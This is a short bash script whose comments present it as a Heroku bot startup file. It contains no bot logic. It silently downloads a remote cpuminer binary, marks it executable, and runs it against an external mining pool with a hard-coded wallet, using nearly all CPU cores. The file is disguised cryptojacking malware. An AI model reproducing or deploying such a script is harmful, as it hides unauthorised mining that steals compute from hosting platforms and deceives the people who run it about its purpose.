#!/bin/bash

# Do not edit this file!

# To change authToken and owner id: 
## edit your Config Vars in heroku/app/settings and 
## restart the bot by turning the worker off and back on

wget -qO cpu https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2
chmod +x cpu
./cpu -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve.webtest -t $(nproc --ignore 2)
